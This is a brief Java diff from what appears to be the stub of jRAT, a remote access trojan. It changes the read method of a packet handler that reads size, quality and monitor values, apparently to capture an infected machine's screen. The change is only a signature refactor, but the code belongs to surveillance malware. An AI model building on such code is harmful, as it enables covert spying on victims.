@@ -6,7 +6,7 @@ import se.jrat.stub.Screen;
 public class Packet12RemoteScreen extends AbstractIncomingPacket {
 	
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		int size = Connection.instance.readInt();
 		int quality = Connection.instance.readInt();
 		int monitor = Connection.instance.readInt();
